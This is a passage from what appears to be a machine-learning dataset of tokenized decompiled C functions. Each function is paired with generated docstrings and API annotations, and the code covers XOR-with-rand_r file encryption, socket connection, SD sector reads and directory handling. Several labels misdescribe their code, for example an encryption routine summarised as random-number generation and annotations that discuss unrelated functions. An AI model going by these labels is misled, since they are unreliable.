            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "int",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "int",
            "sd_context_part_validate_mmc",
            ";",
            "int",
            "result",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "(",
            "*",
            "v14",
            ")",
            "(",
            "void",
            ")",
            ";",
            "if",
            "(",
            "a2",
            "|",
            "|",
            "a4",
            "<",
            "=",
            "0",
            "|",
            "|",
            "(",
            "sd_context_part_validate_mmc",
            "=",
            "get_sd_context_part_validate_mmc",
            "(",
            "0",
            ")",
            ",",
            "sd_context_part_validate_mmc",
            "!",
            "=",
            "a1",
            ")",
            ")",
            "{",
            "v11",
            "=",
            "a3",
            ";",
            "v12",
            "=",
            "a2",
            ";",
            "v13",
            "=",
            "a1",
            ";",
            "v10",
            "=",
            "a4",
            ";",
            "v14",
            "=",
            "sdstor_read_sector",
            ";",
            "return",
            "(",
            "(",
            "int",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "int",
            ",",
            "int",
            ",",
            "int",
            ",",
            "int",
            ")",
            ")",
            "v14",
            ")",
            "(",
            "v13",
            ",",
            "v12",
            ",",
            "v11",
            ",",
            "v10",
            ")",
            ";",
            "}",
            "result",
            "=",
            "sdstor_read_sector",
            "(",
            ")",
            ";",
            "if",
            "(",
            "result",
            ">",
            "=",
            "0",
            "&",
            "&",
            "a4",
            "!",
            "=",
            "1",
            ")",
            "{",
            "v10",
            "=",
            "a4",
            "-",
            "1",
            ";",
            "v11",
            "=",
            "a3",
            "+",
            "512",
            ";",
            "v12",
            "=",
            "1",
            ";",
            "v13",
            "=",
            "sd_context_part_validate_mmc",
            ";",
            "v14",
            "=",
            "sdstor_read_sector",
            ";",
            "return",
            "(",
            "(",
            "int",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "int",
            ",",
            "int",
            ",",
            "int",
            ",",
            "int",
            ")",
            ")",
            "v14",
            ")",
            "(",
            "v13",
            ",",
            "v12",
            ",",
            "v11",
            ",",
            "v10",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"context\" function appears to be part of a larger C program, possibly related to parsing, where it manages a data structure representing configurations or rules within a grammar, and includes error handling with the ability to reset the context upon encountering errors.",
            "The `part_valid` function is used to verify whether a given `hd_struct` pointer corresponds to a valid partition within a `gendisk` structure.",
            "The function \"part_validate\" is used to perform a sanity check on a supplied flash partition by searching the table of existing MTD or NOR flash devices, locating the partition device, and verifying its alignment with the granularity of flash erasesize or sectors.",
            "The function `sdstor_read` likely reads data from an SD storage device, handling tasks related to retrieving information or content stored on an SD card or similar storage medium."
        ],
        "longer_label": "The code is a patched function for reading sectors from a storage device, which includes error handling and validation checks for the context and partitions."
    },
    {
        "id": 421,
        "docstring_tokens": [
            "The",
            "code",
            "encrypts",
            "a",
            "plaintext",
            "file",
            "using",
            "a",
            "given",
            "key",
            "seed",
            ",",
            "creating",
            "a",
            "cipher",
            "file",
            "with",
            "encrypted",
            "data",
            "chunks",
            "using",
            "parallel",
            "processing",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "unsigned",
            "int",
            "a3",
            ")",
            "{",
            "double",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "unsigned",
            "int",
            "seed",
            ";",
            "unsigned",
            "int",
            "v7",
            ";",
            "unsigned",
            "int",
            "v8",
            ";",
            "unsigned",
            "int",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "unsigned",
            "__int64",
            "v14",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "__int64",
            "v16",
            "[",
            "8",
            "]",
            ";",
            "v7",
            "=",
            "a1",
            ";",
            "seed",
            "=",
            "a3",
            ";",
            "v16",
            "[",
            "7",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "fget_file_size",
            "(",
            "v7",
            ",",
            "&",
            "v10",
            ")",
            ")",
            "{",
            "perr",
            "(",
            "\"Error getting plaintext file size\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v12",
            "=",
            "memory_map",
            "(",
            "v7",
            ",",
            "v10",
            ",",
            "1L",
            "L",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v12",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "create_cipher_file",
            "(",
            "a2",
            ",",
            "v10",
            ",",
            "&",
            "v8",
            ")",
            ")",
            "{",
            "perr",
            "(",
            "\"Error mapping the cipher file\"",
            ")",
            ";",
            "memory_unmap",
            "(",
            "v12",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v13",
            "=",
            "memory_map",
            "(",
            "v8",
            ",",
            "v10",
            ",",
            "3L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v13",
            ")",
            "{",
            "v4",
            "=",
            "ceil",
            "(",
            "(",
            "float",
            ")",
            "(",
            "(",
            "float",
            ")",
            "(",
            "int",
            ")",
            "v10",
            "/",
            "262144",
            ".",
            "0",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ">",
            "=",
            "9",
            ".",
            "223372036854776",
            "e18",
            ")",
            "{",
            "v14",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "int",
            ")",
            "(",
            "v4",
            "-",
            "9",
            ".",
            "223372036854776",
            "e18",
            ")",
            ";",
            "v14",
            "^",
            "=",
            "0x8000000000000000L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v14",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "int",
            ")",
            "v4",
            ";",
            "}",
            "ptr",
            "=",
            "malloc",
            "(",
            "4",
            "*",
            "v14",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "v14",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v5",
            "=",
            "rand_r",
            "(",
            "&",
            "seed",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            "=",
            "v5",
            ";",
            "}",
            "v9",
            "=",
            "0",
            ";",
            "v16",
            "[",
            "4",
            "]",
            "=",
            "(",
            "__int64",
            ")",
            "ptr",
            ";",
            "v16",
            "[",
            "3",
            "]",
            "=",
            "v14",
            ";",
            "v16",
            "[",
            "2",
            "]",
            "=",
            "v13",
            ";",
            "v16",
            "[",
            "1",
            "]",
            "=",
            "v12",
            ";",
            "v16",
            "[",
            "0",
            "]",
            "=",
            "(",
            "__int64",
            ")",
            "&",
            "v10",
            ";",
            "v16",
            "[",
            "5",
            "]",
            "=",
            "(",
            "__int64",
            ")",
            "&",
            "v9",
            ";",
            "GOMP_parallel",
            "(",
            "encrypt__omp_fn_0",
            ",",
            "v16",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "memory_unmap",
            "(",
            "v12",
            ")",
            ";",
            "memory_unmap",
            "(",
            "v13",
            ")",
            ";",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "unlock_file",
            "(",
            "v8",
            ",",
            "0L",
            "L",
            ",",
            "v10",
            ")",
            ";",
            "close_file",
            "(",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "v9",
            "=",
            "=",
            "-",
            "1",
            ")",
            "delete_file",
            "(",
            "a2",
            ")",
            ";",
            "return",
            "v9",
            ";",
            "}",
            "else",
            "{",
            "perr",
            "(",
            "\"Error mapping the cipher file\"",
            ")",
            ";",
            "memory_unmap",
            "(",
            "v12",
            ")",
            ";",
            "close_file",
            "(",
            "v8",
            ")",
            ";",
            "delete_file",
            "(",
            "a2",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "perr",
            "(",
            "\"Error mapping the file for encryption\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit unsigned integer from a specific offset within the FS segment register, typically utilized in low-level system programming for accessing thread information or processor-specific data structures on x86 and x64 architectures.",
            "The `get_file` function seems to be used for reading files from the filesystem, as it takes a file name (`name`) and size (`size`) as parameters, opens the file (`fopen`), and presumably reads its contents into the provided buffer (`bfr`).",
            "The \"memory\" function appears to be part of a larger codebase, likely related to error handling and debugging within a C program, featuring functionalities for printing memory-related information, including error messages and memory allocation details, possibly aiding in debugging and monitoring memory usage.",
            "The `memory_unmap` function is responsible for deallocating memory previously mapped by `memory_map` or similar functions, ensuring proper memory management and preventing memory leaks."
        ],
        "longer_label": "The provided code is a function for encrypting a file using a parallelized encryption algorithm, utilizing memory mapping for file I/O, dynamic memory allocation for storing random numbers used in encryption, and system-specific functions like `__readfsqword`, with error handling for file mapping and encryption operations."
    },
    {
        "id": 422,
        "docstring_tokens": [
            "The",
            "function",
            "creates",
            "a",
            "cipher",
            "file",
            "with",
            "the",
            "specified",
            "name",
            "and",
            "size",
            ",",
            "opening",
            "it",
            "for",
            "reading",
            "and",
            "writing",
            ",",
            "and",
            "returning",
            "an",
            "error",
            "if",
            "either",
            "the",
            "creation",
            "or",
            "locking",
            "process",
            "fails",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "_DWORD",
            "*",
            "a3",
            ")",
            "{",
            "int",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "*",
            "a3",
            "=",
            "open_file",
            "(",
            "a1",
            ",",
            "7L",
            "L",
            ",",
            "&",
            "v5",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "{",
            "perr",
            "(",
            "\"Error creating the ciphertext file\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "lock_file",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "*",
            "a3",
            ",",
            "0L",
            "L",
            ",",
            "a2",
            ")",
            ")",
            "{",
            "perr",
            "(",
            "\"Error locking the ciphertext file\"",
            ")",
            ";",
            "close_file",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "*",
            "a3",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is likely used to read a 64-bit value from the FS segment register, often utilized in low-level programming for accessing thread information or processor-specific data structures on x86 architectures.",
            "The function \"text\u0120fileclose\" is likely used to close or finalize a text file, possibly after reading from or writing to it."
        ],
        "longer_label": "The provided code is a function `create_cipher_file` intended to create a ciphertext file, utilizing low-level operations such as reading a 64-bit value from the FS segment register, opening a file with certain permissions, locking the file, and handling potential errors, returning an appropriate status code."
    },
    {
        "id": 423,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "establishes",
            "a",
            "connection",
            "with",
            "a",
            "server",
            "using",
            "the",
            "provided",
            "address",
            "and",
            "port",
            ",",
            "setting",
            "up",
            "the",
            "necessary",
            "hints",
            ",",
            "fetching",
            "address",
            "information",
            ",",
            "looping",
            "through",
            "the",
            "obtained",
            "info",
            "to",
            "create",
            "a",
            "socket",
            "and",
            "attempt",
            "a",
            "connection",
            ",",
            "and",
            "returning",
            "the",
            "file",
            "descriptor",
            "of",
            "the",
            "established",
            "connection",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "address",
            ",",
            "const",
            "char",
            "*",
            "port",
            ")",
            "{",
            "addrinfo",
            "*",
            "servinfo",
            ";",
            "addrinfo",
            "hints",
            ";",
            "addrinfo",
            "*",
            "p",
            ";",
            "int",
            "fd",
            ";",
            "memset",
            "(",
            "&",
            "hints",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "hints",
            ")",
            ")",
            ";",
            "hints",
            ".",
            "ai_family",
            "=",
            "0",
            ";",
            "hints",
            ".",
            "ai_socktype",
            "=",
            "1",
            ";",
            "hints",
            ".",
            "ai_flags",
            "=",
            "1",
            ";",
            "if",
            "(",
            "getaddrinfo",
            "(",
            "address",
            ",",
            "port",
            ",",
            "&",
            "hints",
            ",",
            "&",
            "servinfo",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"getaddrinfo\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "p",
            "=",
            "servinfo",
            ";",
            "while",
            "(",
            "p",
            ")",
            "{",
            "fd",
            "=",
            "socket",
            "(",
            "p",
            "-",
            ">",
            "ai_family",
            ",",
            "p",
            "-",
            ">",
            "ai_socktype",
            ",",
            "p",
            "-",
            ">",
            "ai_protocol",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"client: socket\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "p",
            "-",
            ">",
            "ai_addr",
            ",",
            "p",
            "-",
            ">",
            "ai_addrlen",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "perror",
            "(",
            "\"client:bind\"",
            ")",
            ";",
            "}",
            "}",
            "freeaddrinfo",
            "(",
            "servinfo",
            ")",
            ";",
            "return",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `memset` function is being implemented in various contexts, including memory allocation and low-level system functions, to efficiently set a block of memory to a specific value, typically used for initializing memory or clearing it.",
            "The perror function is used to print a descriptive error message to the standard error stream, typically indicating the cause of the most recent error encountered during I/O operations, as demonstrated in the provided code snippet where it handles an error during a write operation.",
            "The \"close\" function appears to be a part of a larger codebase providing various functionalities including file I/O operations, memory mapping, directory iteration, and assembly language instructions, likely intended to close file descriptors or resources associated with file operations."
        ],
        "longer_label": "The provided C code defines a function `makeConnect` which initializes a socket connection to a given address and port using `getaddrinfo`, `socket`, and `connect`, handling errors with `perror`, and freeing memory with `freeaddrinfo`."
    },
    {
        "id": 424,
        "docstring_tokens": [
            "The",
            "code",
            "generates",
            "a",
            "random",
            "number",
            "using",
            "a",
            "given",
            "seed",
            "value",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "encrypt__omp_fn_0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ")",
            "{",
            "unsigned",
            "__int64",
            "num_threads",
            ";",
            "unsigned",
            "__int64",
            "thread_num",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "_QWORD",
            "*",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "unsigned",
            "__int64",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "unsigned",
            "__int64",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "__int64",
            "v21",
            ";",
            "unsigned",
            "__int64",
            "v22",
            ";",
            "__int64",
            "v23",
            ";",
            "__int64",
            "v24",
            ";",
            "__int64",
            "v25",
            ";",
            "unsigned",
            "__int64",
            "v26",
            ";",
            "v11",
            "=",
            "a1",
            ";",
            "v26",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v18",
            "=",
            "a1",
            "[",
            "4",
            "]",
            ";",
            "v19",
            "=",
            "a1",
            "[",
            "3",
            "]",
            ";",
            "v20",
            "=",
            "a1",
            "[",
            "2",
            "]",
            ";",
            "v21",
            "=",
            "a1",
            "[",
            "1",
            "]",
            ";",
            "if",
            "(",
            "v19",
            ")",
            "{",
            "num_threads",
            "=",
            "(",
            "int",
            ")",
            "omp_get_num_threads",
            "(",
            ")",
            ";",
            "thread_num",
            "=",
            "(",
            "int",
            ")",
            "omp_get_thread_num",
            "(",
            ")",
            ";",
            "v3",
            "=",
            "v19",
            "/",
            "num_threads",
            ";",
            "v4",
            "=",
            "v19",
            "%",
            "num_threads",
            ";",
            "if",
            "(",
            "thread_num",
            "<",
            "v19",
            "%",
            "num_threads",
            ")",
            "{",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "+",
            "+",
            "v3",
            ";",
            "}",
            "v5",
            "=",
            "v3",
            "*",
            "thread_num",
            "+",
            "v4",
            ";",
            "v6",
            "=",
            "v5",
            "+",
            "v3",
            ";",
            "if",
            "(",
            "v5",
            "<",
            "v5",
            "+",
            "v3",
            ")",
            "{",
            "v17",
            "=",
            "v5",
            ";",
            "do",
            "{",
            "v22",
            "=",
            "v17",
            "<",
            "<",
            "18",
            ";",
            "if",
            "(",
            "(",
            "signed",
            "__int64",
            ")",
            "(",
            "(",
            "v17",
            "<",
            "<",
            "18",
            ")",
            "+",
            "0x3FFFF",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "v11",
            ")",
            "v9",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "v11",
            "-",
            "v22",
            ";",
            "else",
            "v9",
            "=",
            "0x40000L",
            "L",
            ";",
            "v23",
            "=",
            "v9",
            ";",
            "v24",
            "=",
            "mmap_mapview",
            "(",
            "v21",
            ",",
            "v22",
            ",",
            "v9",
            ")",
            ";",
            "v25",
            "=",
            "mmap_mapview",
            "(",
            "v20",
            ",",
            "v22",
            ",",
            "v23",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v25",
            "|",
            "|",
            "!",
            "v24",
            ")",
            "{",
            "perr",
            "(",
            "\"Error getting mapped file view\"",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v11",
            "[",
            "5",
            "]",
            "=",
            "-",
            "1",
            ";",
            "}",
            "v15",
            "=",
            "(",
            "int",
            ")",
            "floor",
            "(",
            "(",
            "float",
            ")",
            "(",
            "(",
            "float",
            ")",
            "(",
            "int",
            ")",
            "v23",
            "/",
            "4",
            ".",
            "0",
            ")",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v15",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v7",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "4L",
            "L",
            "*",
            "i",
            "+",
            "v24",
            ")",
            ";",
            "v8",
            "=",
            "rand_r",
            "(",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "4",
            "*",
            "v17",
            "+",
            "v18",
            ")",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "4L",
            "L",
            "*",
            "i",
            "+",
            "v25",
            ")",
            "=",
            "v7",
            "^",
            "v8",
            ";",
            "}",
            "v16",
            "=",
            "v23",
            "&",
            "3",
            ";",
            "if",
            "(",
            "(",
            "v23",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v12",
            "=",
            "rand_r",
            "(",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "4",
            "*",
            "v17",
            "+",
            "v18",
            ")",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "v23",
            "-",
            "v16",
            ";",
            "j",
            "<",
            "v23",
            ";",
            "+",
            "+",
            "j",
            ")",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "j",
            "+",
            "v25",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "&",
            "v12",
            "+",
            "v16",
            "-",
            "(",
            "v23",
            "-",
            "j",
            ")",
            ")",
            "^",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "j",
            "+",
            "v24",
            ")",
            ";",
            "}",
            "mmap_unmapview",
            "(",
            "v24",
            ")",
            ";",
            "mmap_unmapview",
            "(",
            "v25",
            ")",
            ";",
            "+",
            "+",
            "v17",
            ";",
            "}",
            "while",
            "(",
            "v17",
            "<",
            "v6",
            ")",
            ";",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v26",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read the value of a specific FS segment register in x86-64 assembly, often utilized for accessing thread-local storage or other system-specific data."
        ],
        "longer_label": "The provided code is an implementation of a parallel encryption function using OpenMP, utilizing thread-local storage and system-specific data access, encrypting data in chunks based on the number of threads available, and employing random number generation for XOR encryption."
    },
    {
        "id": 425,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "an",
            "error",
            "message",
            "and",
            "exits",
            "the",
            "program",
            "with",
            "the",
            "corresponding",
            "error",
            "code",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "perr_exit",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "*",
            "v1",
            ";",
            "perror",
            "(",
            "a1",
            ")",
            ";",
            "v1",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "*",
            "v1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `perr_exit` is used to print an error message, including formatted output, and exit the program with an exit status of 1, typically invoked in error-handling scenarios.",
            "The `_errno_location` function provides a means to obtain the address of the `errno` variable, allowing access to the location where error codes are stored within the program."
        ],
        "longer_label": "The `perr_exit` function is designed to print an error message using perror, access the location of the errno variable with _errno_location, and exit the program with an appropriate error status, typically used for error-handling purposes."
    },
    {
        "id": 426,
        "docstring_tokens": [
            "The",
            "code",
            "sets",
            "errno",
            "to",
            "ENOMEM",
            ",",
            "retrieves",
            "the",
            "error",
            "number",
            "using",
            "get_err",
            "(",
            ")",
            ",",
            "and",
            "closes",
            "the",
            "directory",
            "pointed",
            "to",
            "by",
            "unix_dir",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "DIR",
            "*",
            "a1",
            ",",
            "_DWORD",
            "*",
            "a2",
            ")",
            "{",
            "*",
            "_errno_location",
            "(",
            ")",
            "=",
            "12",
            ";",
            "*",
            "a2",
            "=",
            "get_err",
            "(",
            ")",
            ";",
            "return",
            "closedir",
            "(",
            "a1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"get_errreturn\" likely retrieves error messages or return values from multiple sources or functions within a larger program, consolidating them for further analysis or handling."
        ],
        "longer_label": "The given code is likely a function designed to handle out-of-memory errors in a directory manipulation program, setting the error number to 12, retrieving an error message or return value using the \"get_err\" function, and then closing the directory."
    },
    {
        "id": 427,
        "docstring_tokens": [
            "The",
            "code",
            "opens",
            "a",
            "directory",
            "at",
            "the",
            "specified",
            "path",
            ",",
            "sets",
            "an",
            "error",
            "flag",
            "to",
            "0",
            ",",
            "allocates",
            "memory",
            "for",
            "a",
            "Dir",
            "struct",
            ",",
            "and",
            "returns",
            "a",
            "pointer",
            "to",
            "the",
            "Dir",
            "struct",
            "if",
            "successful",
            ",",
            "otherwise",
            "it",
            "sets",
            "the",
            "error",
            "flag",
            "and",
            "returns",
            "NULL",
            "."
        ],
        "code_tokens": [
            "_QWORD",
            "*",
            "FUN0",
            "open_dir",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "_DWORD",
            "*",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "DIR",
            "*",
            "dirp",
            ";",
            "_QWORD",
            "*",
            "v6",
            ";",
            "*",
            "a2",
            "=",
            "0",
            ";",
            "dirp",
            "=",
            "opendir",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "dirp",
            ")",
            "{",
            "v6",
            "=",
            "malloc",
            "(",
            "0x18uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "&",
            "&",
            "(",
            "v3",
            "=",
            "dirfd",
            "(",
            "dirp",
            ")",
            ",",
            "v4",
            "=",
            "fpathconf",
            "(",
            "v3",
            ",",
            "3",
            ")",
            "+",
            "20",
            ",",
            "*",
            "v6",
            "=",
            "dirp",
            ",",
            "(",
            "v6",
            "[",
            "1",
            "]",
            "=",
            "malloc",
            "(",
            "v4",
            ")",
            ")",
            "!",
            "=",
            "0L",
            "L",
            ")",
            ")",
            "{",
            "v6",
            "[",
            "2",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "return",
            "v6",
            ";",
            "}",
            "else",
            "{",
            "out_of_mem",
            "(",
            "dirp",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "*",
            "a2",
            "=",
            "get_err",
            "(",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function is a memory allocation function typically used to dynamically allocate memory in C programs, allowing for the allocation of memory blocks of specified sizes, often used in conjunction with `free` to manage memory resources efficiently.",
            "The `fpath` function likely constructs the full path of a command by searching through directories specified in the environment variable `PATH`, utilizing functions to split the path and find the command within it, possibly used in a shell or command-line interface program.",
            "The function \"of_mem\" likely returns the end address of a memory block by iterating through a linked list of allocations, ensuring the provided range is within allocated memory, primarily for debugging memory management issues."
        ],
        "longer_label": "The provided code is a function called `open_dir` which attempts to open a directory specified by the input path, allocates memory for directory-related data structures, and returns a pointer to these structures if successful, otherwise returning appropriate error codes or `NULL` in case of failure, with annotations clarifying the purpose of `malloc`, `fpathconf`, and an assumed debugging function `out_of_mem`."
    },
    {
        "id": 428,
        "docstring_tokens": [
            "This",
            "code",
            "closes",
            "a",
            "directory",
            ",",
            "frees",
            "allocated",
            "memory",
            "for",
            "the",
            "previous",
            "directory",
            "entry",
            ",",
            "and",
            "frees",
            "the",
            "directory",
            "structure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "v2",
            "=",
            "closedir",
            "(",
            "*",
            "(",
            "DIR",
            "*",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "free",
            "(",
            "*",
            "(",
            "void",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "free",
            "(",
            "(",
            "void",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"closed\" function likely serves to manage the state of a coroutine, including tracking blocking calls, ownership status, and execution completion, while the provided code snippets suggest it also relates to IO operations and checking the open/closed status of a stream."
        ],
        "longer_label": "The provided code defines a function named `close_dir` which takes a parameter `a1` assumed to be a directory handle, closes the directory using `closedir`, frees allocated memory for the directory handle and its associated buffer, and returns the result of `closedir`."
    },
    {
        "id": 429,
        "docstring_tokens": [
            "This",
            "function",
            "checks",
            "if",
            "there",
            "is",
            "a",
            "next",
            "entry",
            "in",
            "the",
            "given",
            "directory",
            "and",
            "returns",
            "1",
            "if",
            "there",
            "is",
            ",",
            "and",
            "0",
            "if",
            "there",
            "is",
            "n't",
            "."
        ],
        "code_tokens": [
            "_BOOL8",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "readdir64_r",
            "(",
            "*",
            "(",
            "DIR",
            "*",
            "*",
            ")",
            "a1",
            ",",
            "*",
            "(",
            "struct",
            "dirent64",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ",",
            "(",
            "struct",
            "dirent64",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            ";",
            "return",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "!",
            "=",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
